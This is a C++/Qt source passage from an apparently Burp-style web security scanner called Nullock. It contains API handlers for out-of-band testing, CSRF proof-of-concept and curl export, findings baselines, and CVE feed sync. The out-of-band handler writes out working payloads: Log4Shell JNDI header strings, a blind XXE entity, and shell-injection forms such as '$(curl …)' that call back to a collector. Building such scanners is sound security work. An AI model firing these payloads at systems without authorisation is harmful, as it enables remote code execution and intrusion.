        struct Shot { QString kind, note, token, cbUrl; QByteArray request; };
        QList<Shot> shots;

        auto registerShot = [&](const QString &kind, const QString &note,
                                const QString &paramForOrigin) -> QJsonObject {
            const QJsonObject tok = m_wiring.oast->mintToken();
            Nullock::Core::OastOrigin origin;
            origin.rowId = rowId;
            origin.host  = host;
            origin.param = paramForOrigin;
            origin.url   = tok.value("pathUrl").toString();
            origin.kind  = kind;
            origin.note  = note;
            m_wiring.oastCorrelator->registerToken(tok.value("token").toString(), origin);
            return tok;
        };

        // SSRF vectors: one GET per param name, param value = callback URL.
        if (wantSsrf) for (const QString &pname : paramNames) {
            const QJsonObject tok = registerShot("ssrf-oast",
                                                 "param:" + pname, pname);
            const QString cbUrl = tok.value("pathUrl").toString();
            QString q = existingQuery;
            if (!q.isEmpty()) q += "&";
            q += pname + "=" + QString::fromUtf8(QUrl::toPercentEncoding(cbUrl));
            Shot s;
            s.kind = "ssrf-oast"; s.note = "param:" + pname;
            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
            s.request  = "GET " + (basePath + "?" + q).toUtf8() + " HTTP/1.1\r\n";
            s.request += "Host: " + host.toUtf8() + "\r\n";
            s.request += "User-Agent: Nullock/oast-blast\r\n";
            s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
            shots.append(s);
        }

        // Log4Shell: inject ${jndi:ldap://<token>.<dns-host>/a} into the
        // headers most often logged (User-Agent, Referer, X-Api-Version,
        // X-Forwarded-For). A vulnerable log4j evaluates the lookup, which
        // first RESOLVES the hostname -- and that DNS query lands on our
        // DNS sink even when LDAP egress is blocked. Only fired when the
        // DNS sink is up (no DNS sink = no way to confirm it).
        const bool wantLog4shell =
            bodyJson.value("log4shell").toBool(m_wiring.dnsSink && m_wiring.dnsSink->running());
        if (wantLog4shell && m_wiring.dnsSink && m_wiring.dnsSink->running()) {
            const QString dnsHost = m_wiring.dnsSink->baseHost();
            const int dnsPort = m_wiring.dnsSink->port();
            static const char *kLog4Headers[] = {
                "User-Agent", "Referer", "X-Api-Version",
                "X-Forwarded-For", "X-Client-Ip",
            };
            for (const char *hname : kLog4Headers) {
                const QJsonObject tok = registerShot("log4shell-oast",
                    QString("header:%1").arg(QString::fromLatin1(hname)),
                    QString::fromLatin1(hname));
                const QString token = tok.value("token").toString();
                // DNS-form canary: <token>.<dns-host>. The :port is for
                // the LDAP leg; the resolver only needs the hostname.
                const QString jndi =
                    QString("${jndi:ldap://%1.%2:%3/a}").arg(token, dnsHost)
                        .arg(dnsPort);
                Shot s;
                s.kind = "log4shell-oast";
                s.note = QString("header:%1").arg(QString::fromLatin1(hname));
                s.token = token;
                s.cbUrl = QString("dns://%1.%2").arg(token, dnsHost);
                s.request  = "GET " + basePath.toUtf8()
                           + (existingQuery.isEmpty() ? QByteArray()
                                                      : "?" + existingQuery.toUtf8())
                           + " HTTP/1.1\r\n";
                s.request += "Host: " + host.toUtf8() + "\r\n";
                s.request += QByteArray(hname) + ": " + jndi.toUtf8() + "\r\n";
                s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
                shots.append(s);
            }
        }

        // Blind XXE: POST an XML body whose external entity resolves to
        // our sink. Confirmation = the target's XML parser fetched it.
        if (wantXxe) {
            const QJsonObject tok = registerShot("xxe-oast", "xml-external-entity", "xml-body");
            const QString cbUrl = tok.value("pathUrl").toString();
            QByteArray xml =
                "<?xml version=\"1.0\"?>\r\n"
                "<!DOCTYPE r [<!ENTITY x SYSTEM \"" + cbUrl.toUtf8() + "\">]>\r\n"
                "<r>&x;</r>";
            Shot s;
            s.kind = "xxe-oast"; s.note = "xml-external-entity";
            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
            s.request  = "POST " + basePath.toUtf8() + " HTTP/1.1\r\n";
            s.request += "Host: " + host.toUtf8() + "\r\n";
            s.request += "User-Agent: Nullock/oast-blast\r\n";
            s.request += "Content-Type: application/xml\r\n";
            s.request += "Content-Length: " + QByteArray::number(xml.size()) + "\r\n";
            s.request += "Connection: close\r\n\r\n";
            s.request += xml;
            shots.append(s);
        }

        // Blind OS command injection: wrap a curl/wget to our HTTP sink in shell
        // metacharacters and inject it into command-prone params. A vulnerable
        // shell executes the fetch and the callback lands on the sink -- a
        // critical blind-RCE confirmation that no response echo can give. (The
        // sink URL is benign: an HTTP GET to our own collector, no payload.)
        if (wantRce) {
            static const char *kCmdParams[] = {
                "cmd", "exec", "command", "run", "ping", "host", "ip", "target",
            };
            // %1 = the HTTP callback URL. Covers ;sep, |pipe, $(...) and `...`
            // substitution, and a newline-prefixed line so a logged/echoed
            // command boundary still runs it.
            static const char *kCmdForms[] = {
                ";curl %1;", "|curl %1", "$(curl %1)", "`curl %1`", "%0acurl %1",
            };
            for (const char *pn : kCmdParams) {
                const QString pname = QString::fromLatin1(pn);
                for (const char *cf : kCmdForms) {
                    const QJsonObject tok = registerShot("rce-oast", "param:" + pname, pname);
                    const QString cbUrl = tok.value("pathUrl").toString();
                    const QString payload = QString::fromLatin1(cf).arg(cbUrl);
                    QString q = existingQuery;
                    if (!q.isEmpty()) q += "&";
                    q += pname + "=" + QString::fromUtf8(QUrl::toPercentEncoding(payload));
                    Shot s;
                    s.kind = "rce-oast"; s.note = "param:" + pname;
                    s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
                    s.request  = "GET " + (basePath + "?" + q).toUtf8() + " HTTP/1.1\r\n";
                    s.request += "Host: " + host.toUtf8() + "\r\n";
                    s.request += "User-Agent: Nullock/oast-blast\r\n";
                    s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
                    shots.append(s);
                }
            }
        }

        // Fire everything async; the response returns the fired vectors so
        // the caller can watch /api/snapshot .oast.confirmed climb.
        QList<QByteArray> requests;
        for (const Shot &s : shots) requests.append(s.request);
        (void)QtConcurrent::run([host, port, useTls, requests]() {
            Nullock::Core::HttpClient client;
            for (const QByteArray &req : requests) {
                client.send(host, static_cast<quint16>(port), useTls, req);
            }
        });

        QJsonArray vectors;
        for (const Shot &s : shots)
            vectors.append(QJsonObject{
                { "kind", s.kind }, { "note", s.note },
                { "token", s.token }, { "callbackUrl", s.cbUrl } });
        return okJson({{ "fired", static_cast<int>(shots.size()) },
                       { "target", url },
                       { "vectors", vectors }});
    }

    // ---- Session handling rules --------------------------------------
    // POST /api/session-rules/set { rules: [SessionRule, ...] }
    if (path == "/api/session-rules/set") {
        if (!m_wiring.sessionRules)
            return okJson({{ "ok", false }, { "error", "session rules not wired" }});
        QList<Nullock::Core::SessionRule> rules;
        for (const QJsonValue &v : bodyJson.value("rules").toArray()) {
            const QJsonObject o = v.toObject();
            Nullock::Core::SessionRule r;
            r.name           = o.value("name").toString();
            r.enabled        = o.value("enabled").toBool(true);
            r.hostGlob       = o.value("hostGlob").toString("*");
            r.pathGlob       = o.value("pathGlob").toString("*");
            r.extractFrom    = o.value("extractFrom").toInt(0);
            r.extractKey     = o.value("extractKey").toString();
            r.variable       = o.value("variable").toString();
            r.injectInto     = o.value("injectInto").toInt(0);
            r.injectKey      = o.value("injectKey").toString();
            r.injectTemplate = o.value("injectTemplate").toString();
            rules.append(r);
        }
        m_wiring.sessionRules->setRules(rules);
        return okJson();
    }
    if (path == "/api/session-rules/clear-vars") {
        if (m_wiring.sessionRules) m_wiring.sessionRules->clearAll();
        return okJson();
    }

    // ---- Full row fetch by id (cold-storage path) --------------------
    // GET /api/history/full/<id> -- reads the full HttpRequest +
    // HttpResponse from the SQLite store. Used by the UI when the user
    // navigates to a row that has been evicted from the in-memory
    // ProxyModel window. Returns the same shape as snapshot's row
    // entries, plus rawRequest and rawResponse pre-rendered.
    if (path.startsWith("/api/history/full/")) {
        bool ok = false;
        const int id = path.mid(QString("/api/history/full/").size()).toInt(&ok);
        if (!ok || id <= 0)
            return httpJson(400, QJsonObject{{ "error", "bad id" }});
        if (!m_wiring.projectStore)
            return httpJson(404, QJsonObject{{ "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return httpJson(503, QJsonObject{{ "error", "history index not ready" }});
        const auto fr = idx->loadFullRow(id);
        if (!fr.ok)
            return httpJson(404, QJsonObject{{ "error", "row not found" }});
        QJsonObject o;
        o["id"]     = id;
        o["method"] = fr.request.method;
        o["host"]   = fr.request.host;
        o["port"]   = fr.request.port;
        o["path"]   = fr.request.path;
        o["status"] = fr.response.statusCode;
        o["size"]   = static_cast<qint64>(fr.response.body.size());
        o["tls"]    = fr.response.wasTls;
        // Pre-render so the React UI doesn't have to reconstruct.
        const QString req = m_wiring.history
            ? m_wiring.history->requestRawById(id)
            : QString();
        const QString rsp = m_wiring.history
            ? m_wiring.history->responseRawById(id)
            : QString();
        o["rawRequest"]  = req.isEmpty() ? idx->loadFullRequestRaw(id)  : req;
        o["rawResponse"] = rsp.isEmpty() ? idx->loadFullResponseRaw(id) : rsp;
        return httpJson(200, o);
    }

    // ---- CSRF PoC generator ------------------------------------------
    // POST /api/csrf/poc { id } | { method, url, contentType?, body? }
    //   Generates an auto-submitting HTML CSRF PoC from a captured request
    //   (by history id) or from explicit fields. Pure transform. CWE-352.
    if (path == "/api/csrf/poc") {
        QString method      = bodyJson.value("method").toString();
        QString url         = bodyJson.value("url").toString();
        QString contentType = contentTypeFromJson(bodyJson);
        QString body        = bodyJson.value("body").toString();
        const int id        = bodyJson.value("id").toInt(0);
        if (id > 0) {
            if (!m_wiring.projectStore)
                return okJson({{ "ok", false }, { "error", "no project store" }});
            auto *idx = m_wiring.projectStore->historyIndex();
            if (!idx || !idx->isOpen())
                return okJson({{ "ok", false }, { "error", "history index not ready" }});
            const auto fr = idx->loadFullRow(id);
            if (!fr.ok)
                return okJson({{ "ok", false }, { "error", "row not found" }});
            method = fr.request.method;
            const QString scheme = fr.response.wasTls ? "https" : "http";
            const bool defPort = (fr.response.wasTls && fr.request.port == 443)
                              || (!fr.response.wasTls && fr.request.port == 80);
            url = scheme + "://" + fr.request.host
                + (defPort ? QString() : ":" + QString::number(fr.request.port))
                + fr.request.path;
            for (const auto &hh : fr.request.headers)
                if (hh.first.compare("Content-Type", Qt::CaseInsensitive) == 0)
                    contentType = hh.second;
            body = QString::fromUtf8(fr.request.body);
        }
        if (url.isEmpty())
            return okJson({{ "ok", false }, { "error", "need a history id or a url" }});
        QString note;
        const QString html = Nullock::Core::RequestExport::csrfPoc(method, url, contentType, body, note);
        return okJson({{ "ok", true }, { "method", method.toUpper() },
                       { "url", url }, { "note", note }, { "html", html }});
    }

    // ---- Copy a captured request as a curl command -------------------
    // POST /api/request/curl { id } | { method, url, headers?, body? }
    //   Reproduces a request (by history id, or explicit fields) as a
    //   runnable curl command for replay / sharing. Pure transform.
    if (path == "/api/request/curl") {
        QString method = bodyJson.value("method").toString();
        QString url    = bodyJson.value("url").toString();
        QString body   = bodyJson.value("body").toString();
        QList<QPair<QString, QString>> headers;
        const int id   = bodyJson.value("id").toInt(0);
        if (id > 0) {
            if (!m_wiring.projectStore)
                return okJson({{ "ok", false }, { "error", "no project store" }});
            auto *idx = m_wiring.projectStore->historyIndex();
            if (!idx || !idx->isOpen())
                return okJson({{ "ok", false }, { "error", "history index not ready" }});
            const auto fr = idx->loadFullRow(id);
            if (!fr.ok)
                return okJson({{ "ok", false }, { "error", "row not found" }});
            method = fr.request.method;
            const QString scheme = fr.response.wasTls ? "https" : "http";
            const bool defPort = (fr.response.wasTls && fr.request.port == 443)
                              || (!fr.response.wasTls && fr.request.port == 80);
            url = scheme + "://" + fr.request.host
                + (defPort ? QString() : ":" + QString::number(fr.request.port))
                + fr.request.path;
            headers = fr.request.headers;
            body = QString::fromUtf8(fr.request.body);
        } else {
            const QJsonObject hh = bodyJson.value("headers").toObject();
            for (auto it = hh.begin(); it != hh.end(); ++it)
                headers.append({ it.key(), it.value().toString() });
        }
        if (url.isEmpty())
            return okJson({{ "ok", false }, { "error", "need a history id or a url" }});
        return okJson({{ "ok", true },
                       { "curl", Nullock::Core::RequestExport::curlCommand(method, url, headers, body) }});
    }

    // ---- SQLite-backed history find ----------------------------------
    // POST /api/history/find { method?, host?, path?, status?, minSize?,
    //                          maxSize?, sinceMs?, limit? }
    // SQL-indexed search across every row ever captured in this
    // project. Beats scanning the in-memory ProxyModel for big histories.
    if (path == "/api/history/find") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return okJson({{ "ok", false }, { "error", "history index not available" }});
        const QJsonArray rows = idx->find(bodyJson);
        QJsonObject r;
        r["rows"]  = rows;
        r["count"] = rows.size();
        return httpJson(200, r);
    }

    // ---- Crawler -----------------------------------------------------
    // POST /api/crawler/start { seed, maxPages?, maxDepth?, throttleMs? }
    if (path == "/api/crawler/start") {
        if (!m_wiring.crawler)
            return okJson({{ "ok", false }, { "error", "crawler not wired" }});
        const QString seed = bodyJson.value("seed").toString();
        const int maxPages = bodyJson.value("maxPages").toInt(200);
        const int maxDepth = bodyJson.value("maxDepth").toInt(4);
        const int throttle = bodyJson.value("throttleMs").toInt(200);
        const bool ok = m_wiring.crawler->start(seed, maxPages, maxDepth, throttle);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/crawler/stop") {
        if (m_wiring.crawler) m_wiring.crawler->stop();
        return okJson();
    }

    // ---- Findings grouped / deduped ----------------------------------
    // GET /api/findings/grouped -- collapses findings with the same
    // (kind, host) into a single entry with instance count + sample
    // rowIds. Burp shows everything; we triage.
    if (path == "/api/findings/grouped") {
        if (!m_wiring.scanner)
            return httpJson(200, QJsonObject{{ "groups", QJsonArray() }});
        // Group key: kind|host. Track count, max severity, sample rowIds,
        // first cwe/owasp/cvss (they're consistent within a kind anyway).
        struct Bucket {
            QString kind, host, severity, summary, cwe, owasp, fix;
            double  cvssMax = 0;
            int     instances = 0;
            QList<int> sampleRowIds;
        };
        QMap<QString, Bucket> buckets;
        const auto findings = m_wiring.scanner->findings(0);
        const QHash<QString, int> sevOrder = {
            {"info",0},{"low",1},{"medium",2},{"high",3},{"critical",4}
        };
        for (const auto &f : findings) {
            const QString k = f.kind + "|" + f.host;
            Bucket &b = buckets[k];
            if (b.kind.isEmpty()) {
                b.kind = f.kind; b.host = f.host;
                b.summary = f.summary; b.cwe = f.cwe; b.owasp = f.owasp;
                b.fix = f.fixSummary; b.severity = f.severity;
            }
            if (sevOrder.value(f.severity, -1) > sevOrder.value(b.severity, -1))
                b.severity = f.severity;
            if (f.cvssScore > b.cvssMax) b.cvssMax = f.cvssScore;
            ++b.instances;
            if (b.sampleRowIds.size() < 5) b.sampleRowIds.append(f.rowId);
        }
        QJsonArray arr;
        for (const Bucket &b : buckets) {
            QJsonObject o;
            o["kind"]      = b.kind;
            o["host"]      = b.host;
            o["severity"]  = b.severity;
            o["summary"]   = b.summary;
            o["instances"] = b.instances;
            o["cvssScore"] = b.cvssMax;
            o["cwe"]       = b.cwe;
            o["owasp"]     = b.owasp;
            o["fix"]       = b.fix;
            QJsonArray rids;
            for (int r : b.sampleRowIds) rids.append(r);
            o["sampleRowIds"] = rids;
            arr.append(o);
        }
        QJsonObject root; root["groups"] = arr;
        return httpJson(200, root);
    }

    // ---- Asset inventory ---------------------------------------------
    // GET /api/inventory -- host-centric attack-surface rollup. Merges the
    // port scanner's open ports/services with the passive scanner's findings
    // into one record per host (open ports, detected technologies, finding
    // counts by severity, max CVSS, top severity, distinct kinds). Read-only
    // aggregation of existing state -- no network, no probing. The natural
    // "what do I know about each host" view after a scan + assessment.
    if (path == "/api/inventory") {
        const auto portResults = m_wiring.portScanner
            ? m_wiring.portScanner->results() : QList<Nullock::Core::PortResult>();
        const auto findings = m_wiring.scanner
            ? m_wiring.scanner->findings(0) : QList<Nullock::Core::Finding>();
        return httpJson(200, computeInventory(portResults, findings));
    }

    // ---- Findings baseline / diff ------------------------------------
    // Repeat-engagement delta detection. Save a baseline snapshot of the
    // current findings, then diff later: NEW (regressions) / FIXED (resolved)
    // / UNCHANGED. Identity key = kind+host+url+summary (a stable per-issue id,
    // the same key used for dedup elsewhere). Persisted to <project>/baseline.json
    // so it survives restarts. Read-only over findings; no network/probing.
    if (path.startsWith("/api/baseline/")) {
        const QString projDir = m_wiring.projectStore
            ? m_wiring.projectStore->currentPath() : QString();
        const QString baseFile = projDir.isEmpty()
            ? QString() : projDir + "/baseline.json";
        const QChar sep(QChar(0x1f));
        auto keyOf = [&](const QString &kind, const QString &host,
                         const QString &url, const QString &summary) {
            return kind + sep + host + sep + url + sep + summary;
        };
        auto findingObj = [](const Nullock::Core::Finding &f) {
            return QJsonObject{
                { "kind", f.kind }, { "host", f.host }, { "url", f.url },
                { "summary", f.summary }, { "severity", f.severity },
                // Carry enrichment so the diff's new/fixed lists are directly
                // reportable (and the "fixed" list, rebuilt from the stored
                // baseline, keeps it too). Identity key ignores these fields.
                { "cwe", f.cwe }, { "owasp", f.owasp },
                { "cvssScore", f.cvssScore }, { "fixSummary", f.fixSummary },
            };
        };

        if (path == "/api/baseline/save") {
            if (!m_wiring.scanner)
                return okJson({{ "ok", false }, { "error", "no scanner wired" }});
            if (baseFile.isEmpty())
                return okJson({{ "ok", false }, { "error", "no project open to store the baseline" }});
            // Dedup by identity key at save time so the stored count matches the
            // deduped count /diff computes (the scanner can hold duplicates).
            QJsonArray arr;
            QSet<QString> seen;
            for (const auto &f : m_wiring.scanner->findings(0)) {
                const QString k = keyOf(f.kind, f.host, f.url, f.summary);
                if (seen.contains(k)) continue;
                seen.insert(k);
                arr.append(findingObj(f));
            }
            const QString savedAt = QDateTime::currentDateTimeUtc().toString(Qt::ISODate);
            const QJsonObject root{
                { "savedAt", savedAt }, { "count", arr.size() }, { "findings", arr },
            };
            // Atomic write: QSaveFile writes to a temp and only replaces the prior
            // baseline on a fully-flushed, successful commit. A crash / disk-full /
            // torn write therefore never destroys the existing good baseline, and
            // we report failure honestly instead of a false ok:true.
            QSaveFile fh(baseFile);
            if (!fh.open(QIODevice::WriteOnly))
                return okJson({{ "ok", false }, { "error", "cannot write baseline file" }});
            const QByteArray out = QJsonDocument(root).toJson(QJsonDocument::Compact);
            if (fh.write(out) != out.size() || !fh.commit())
                return okJson({{ "ok", false }, { "error", "failed to write baseline file" }});
            return okJson({{ "ok", true }, { "saved", arr.size() },
                           { "savedAt", savedAt }, { "path", baseFile }});
        }

        // exists = a valid baseline was loaded; corrupt = the file is present but
        // unreadable/unparseable (distinct from simply absent, so the UI can warn
        // instead of silently showing "no baseline").
        auto loadBaseline = [&](bool &exists, bool &corrupt) -> QJsonObject {
            exists = false; corrupt = false;
            if (baseFile.isEmpty()) return {};
            QFile fh(baseFile);
            if (!fh.open(QIODevice::ReadOnly)) {
                corrupt = QFile::exists(baseFile);  // present but unreadable
                return {};
            }
            const QByteArray raw = fh.readAll();
            fh.close();
            QJsonParseError pe;
            const QJsonDocument doc = QJsonDocument::fromJson(raw, &pe);
            if (pe.error != QJsonParseError::NoError || !doc.isObject()) {
                corrupt = true;
                return {};
            }
            exists = true;
            return doc.object();
        };

        if (path == "/api/baseline/status") {
            bool exists = false, corrupt = false;
            const QJsonObject b = loadBaseline(exists, corrupt);
            return okJson({
                { "ok", true },
                { "hasBaseline", exists },
                { "corrupt", corrupt },
                { "savedAt", exists ? b.value("savedAt").toString() : QString() },
                { "baselineCount", exists ? b.value("count").toInt() : 0 },
            });
        }

        if (path == "/api/baseline/clear") {
            if (!baseFile.isEmpty()) QFile::remove(baseFile);
            return okJson({{ "ok", true }});
        }

        if (path == "/api/baseline/diff") {
            if (!m_wiring.scanner)
                return okJson({{ "ok", false }, { "error", "no scanner wired" }});
            bool exists = false, corrupt = false;
            const QJsonObject b = loadBaseline(exists, corrupt);
            if (!exists)
                return okJson({{ "ok", true }, { "hasBaseline", false }, { "corrupt", corrupt }});

            // Baseline: distinct keys -> object (for the "fixed" list).
            QHash<QString, QJsonObject> baseByKey;
            for (const auto &v : b.value("findings").toArray()) {
                const QJsonObject o = v.toObject();
                baseByKey.insert(keyOf(o.value("kind").toString(), o.value("host").toString(),
                                       o.value("url").toString(), o.value("summary").toString()), o);
            }
            // Current: distinct keys; collect NEW (current keys absent from baseline).
            QSet<QString> curKeys, addedNew;
            QJsonArray newArr;
            for (const auto &f : m_wiring.scanner->findings(0)) {
                const QString k = keyOf(f.kind, f.host, f.url, f.summary);
                curKeys.insert(k);
                if (!baseByKey.contains(k) && !addedNew.contains(k)) {
                    addedNew.insert(k);
                    newArr.append(findingObj(f));
                }
            }
            // FIXED = baseline keys absent from current.
            QJsonArray fixedArr;
            for (auto it = baseByKey.constBegin(); it != baseByKey.constEnd(); ++it)
                if (!curKeys.contains(it.key())) fixedArr.append(it.value());

            return okJson({
                { "ok", true },
                { "hasBaseline", true },
                { "savedAt", b.value("savedAt").toString() },
                { "baselineCount", baseByKey.size() },
                { "currentCount", curKeys.size() },
                { "newCount", newArr.size() },
                { "fixedCount", fixedArr.size() },
                { "unchangedCount", curKeys.size() - newArr.size() },
                { "new", newArr },
                { "fixed", fixedArr },
            });
        }

        return okJson({{ "ok", false }, { "error", "unknown baseline action" }});
    }

    // ---- Security posture / grade ------------------------------------
    // GET /api/posture -- an executive one-number view of the engagement.
    // Starts at 100 and deducts a severity-weighted penalty per finding
    // (critical -40, high -15, medium -5, low -1, info 0), floored at 0, then
    // maps the score to a letter grade. Returns the breakdown + the worst few
    // findings. Read-only aggregation; no network. The posture summary Burp
    // doesn't surface.
    if (path == "/api/posture") {
        QList<Nullock::Core::Finding> findings;
        if (m_wiring.scanner) findings = m_wiring.scanner->findings(0);

        const PostureGrade pg = computePostureGrade(findings);

        auto canonSev = [](const QString &s) -> QString {
            const QString t = s.trimmed().toLower();
            return t.isEmpty() ? QStringLiteral("info") : t;
        };
        // Worst findings first: by severity rank (shared severityRank), then CVSS.
        QList<Nullock::Core::Finding> sorted = findings;
        std::sort(sorted.begin(), sorted.end(),
                  [&](const Nullock::Core::Finding &a, const Nullock::Core::Finding &b) {
            const int ra = severityRank(canonSev(a.severity)), rb = severityRank(canonSev(b.severity));
            if (ra != rb) return ra > rb;
            return a.cvssScore > b.cvssScore;
        });
        QJsonArray topRisks;
        for (int i = 0; i < sorted.size() && i < 5; ++i) {
            const auto &f = sorted[i];
            topRisks.append(QJsonObject{
                { "severity", canonSev(f.severity) }, { "kind", f.kind },
                { "host", f.host }, { "url", f.url },
                { "cvssScore", f.cvssScore }, { "summary", f.summary },
            });
        }

        QJsonObject sevCounts;
        for (auto it = pg.bySeverity.constBegin(); it != pg.bySeverity.constEnd(); ++it)
            sevCounts[it.key()] = it.value();

        return httpJson(200, QJsonObject{
            { "ok", true },
            { "grade", pg.grade },
            { "score", pg.score },
            { "totalFindings", findings.size() },
            { "penalty", pg.penalty },
            { "bySeverity", sevCounts },
            { "topRisks", topRisks },
        });
    }

    // ---- OWASP / compliance coverage ---------------------------------
    // GET /api/compliance -- groups findings by OWASP Top-10 2021 category and
    // by compliance tag (PCI-DSS, etc., from the enricher) into a coverage
    // matrix: which categories the engagement hit, with counts + top severity.
    // Read-only aggregation; no network. The compliance reporting view Burp
    // gates behind Enterprise.
    if (path == "/api/compliance") {
        const auto findings = m_wiring.scanner
            ? m_wiring.scanner->findings(0) : QList<Nullock::Core::Finding>();
        return httpJson(200, computeOwaspCoverage(findings));
    }

    // ---- CVE feed overlay (cve_feed_sync) ----------------------------
    // Extend ServiceVulns detection at runtime with extra service CVEs:
    //   POST /api/cve/sync { entries: [...] }  -- push directly (air-gapped)
    //   POST /api/cve/sync { url: "https://..." } -- fetch + parse a JSON feed
    //   GET  /api/cve/overlay        -> { ok, count }
    //   POST /api/cve/overlay/clear  -> clears the overlay
    // Each entry matches like the curated table (product + version range/exact).
    if (path == "/api/cve/overlay") {
        return httpJson(200, QJsonObject{
            { "ok", true },
            { "count", Nullock::Core::ServiceVulns::overlayCount() },
        });
    }
    if (path == "/api/cve/overlay/clear") {
        Nullock::Core::ServiceVulns::clearOverlay();
        return okJson({{ "ok", true }, { "count", 0 }});
    }
    if (path == "/api/cve/sync") {
        constexpr int kMaxOverlayEntries = 50000;
        // Real-world CVE feeds encode numbers as strings ("cvss":"9.8") or
        // bounds as numbers ("minVer":2.4); coerce loosely so a mistype fails
        // loudly (rejected) rather than silently widening the match.
        auto loose = [](const QJsonValue &v) -> QString {
            if (v.isString()) return v.toString();
            if (v.isDouble()) return QString::number(v.toDouble());
            return QString();
        };
        auto looseBool = [](const QJsonValue &v) -> bool {
            if (v.isBool()) return v.toBool();
            const QString s = v.toString().trimmed().toLower();
            return s == "true" || s == "1";
        };
        auto parseEntries = [&](const QJsonArray &arr) {
            QList<Nullock::Core::ServiceVulns::OverlayCve> out;
            for (const auto &v : arr) {
                if (out.size() >= kMaxOverlayEntries) break;
                if (!v.isObject()) continue;
                const QJsonObject o = v.toObject();
                const QString product = o.value("product").toString().trimmed();
                const QString cveId   = o.value("cveId").toString().trimmed();
                if (product.isEmpty() || cveId.isEmpty()) continue;  // skip malformed rows
                Nullock::Core::ServiceVulns::OverlayCve e;
                e.product    = product;
                e.cveId      = cveId;
                const QJsonValue cv = o.value("cvss");
                e.cvss       = qBound(0.0, cv.isDouble() ? cv.toDouble() : cv.toString().toDouble(), 10.0);
                e.cvssVector = o.value("cvssVector").toString();
                e.minVer     = loose(o.value("minVer")).trimmed();
                e.maxVer     = loose(o.value("maxVer")).trimmed();
                e.exact      = looseBool(o.value("exact"));
                e.affected   = o.value("affected").toString();
                e.summary    = o.value("summary").toString();
                e.fix        = o.value("fix").toString();
                e.reference  = o.value("reference").toString();
                // Reject "matches every version" rows: a non-exact entry needs at
                // least one bound; an exact entry needs a pin. Otherwise an
                // untrusted/typo'd feed row flags every version of the product.
                if (e.exact) { if (e.minVer.isEmpty()) continue; }
                else if (e.minVer.isEmpty() && e.maxVer.isEmpty()) continue;
                out.append(e);
            }
            return out;
        };

        QString source;
        QJsonArray feedArr;
        if (bodyJson.contains("entries")) {
            feedArr = bodyJson.value("entries").toArray();
            source = QStringLiteral("direct");
        } else {
            const QString url = bodyJson.value("url").toString();
            const QUrl u(url);
            if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
                return okJson({{ "ok", false }, { "error", "provide entries[] or a valid url" }});
            // SSRF guard: this fetches an operator-supplied URL, so restrict the
            // scheme to http/https and refuse loopback/link-local/private/reserved
            // destinations -- a feed URL must not become a probe of internal
            // services (127.0.0.1, 169.254.169.254 metadata, RFC1918, localhost).
            if (u.scheme() != "http" && u.scheme() != "https")
                return okJson({{ "ok", false }, { "error", "feed url must be http(s)" }});
            {
                const QString h = u.host().toLower();
                bool blocked = (h == "localhost" || h.endsWith(".localhost"));
                QHostAddress addr(u.host());
                if (!addr.isNull()) {
                    if (addr.isLoopback() || addr.isLinkLocal() || addr.isMulticast())
                        blocked = true;
                    if (addr.protocol() == QAbstractSocket::IPv4Protocol) {
                        const quint32 ip = addr.toIPv4Address();
                        const quint8 a = (ip >> 24) & 0xFF, b = (ip >> 16) & 0xFF;
                        if (a == 10 || a == 127 || a == 0
                            || (a == 172 && b >= 16 && b <= 31)
                            || (a == 192 && b == 168)
                            || (a == 169 && b == 254)) blocked = true;
                    } else if (addr.protocol() == QAbstractSocket::IPv6Protocol) {
                        const Q_IPV6ADDR v6 = addr.toIPv6Address();
                        if ((v6[0] & 0xFE) == 0xFC) blocked = true;  // fc00::/7 unique-local
                    }
                }
                if (blocked)
                    return okJson({{ "ok", false }, { "scopeBlocked", true },
                                   { "error", "feed host is a private/loopback/link-local address (SSRF blocked)" }});
            }
            const bool tls = (u.scheme() == "https");
            const int port = u.port(tls ? 443 : 80);
            QString reqPath = u.path(QUrl::FullyEncoded);
            if (reqPath.isEmpty()) reqPath = QStringLiteral("/");
            const QString q = u.query(QUrl::FullyEncoded);
            if (!q.isEmpty()) reqPath += "?" + q;
            QByteArray req;
            req += "GET " + reqPath.toUtf8() + " HTTP/1.1\r\n";
            req += "Host: " + u.host().toUtf8() + "\r\n";
            req += "User-Agent: nullock-cve-sync/1.0\r\n";
            req += "Accept: application/json\r\n";
            req += "Connection: close\r\n\r\n";
            Nullock::Core::HttpClient client;
            auto res = client.send(u.host(), static_cast<quint16>(port), tls, req);
            if (!res.ok)
                return okJson({{ "ok", false }, { "error", "fetch failed: " + res.errorMessage }});
            if (res.parsed.statusCode != 200)
                return okJson({{ "ok", false }, { "error", QString("HTTP %1 from feed").arg(res.parsed.statusCode) }});
            if (res.parsed.body.size() > 8 * 1024 * 1024)
                return okJson({{ "ok", false }, { "error", "feed too large (>8MB)" }});
            QJsonParseError pe;
            const QJsonDocument doc = QJsonDocument::fromJson(res.parsed.body, &pe);
            if (pe.error != QJsonParseError::NoError)
                return okJson({{ "ok", false }, { "error", "feed is not valid JSON" }});
            // Accept a bare array, or { entries:[...] } / { cves:[...] }.
            if (doc.isArray()) feedArr = doc.array();
            else if (doc.isObject()) {
                const QJsonObject o = doc.object();
                feedArr = o.contains("entries") ? o.value("entries").toArray()
                                                : o.value("cves").toArray();
            }
            source = u.host();
        }

        const auto entries = parseEntries(feedArr);
        const int n = Nullock::Core::ServiceVulns::setOverlay(entries);
        return okJson({
            { "ok", true },
            { "synced", n },
            { "received", feedArr.size() },
            { "dropped", static_cast<int>(feedArr.size()) - n },
            { "source", source },
        });
    }

    // ---- AI payload generator ----------------------------------------
    // POST /api/payloads/generate { kind: "xss", count: 20,
    //                                model?: "qwen2.5:14b", ollama?: "..." }
    // Asks a local Ollama model to mutate the seed payload set into N
    // novel-but-shaped variants. Genuine differentiator: Burp's payload
    // lists are static; ours grow on demand for the target you're hitting.
    if (path == "/api/payloads/generate") {
        const QString kind   = bodyJson.value("kind").toString("xss");
        int count = bodyJson.value("count").toInt(10);
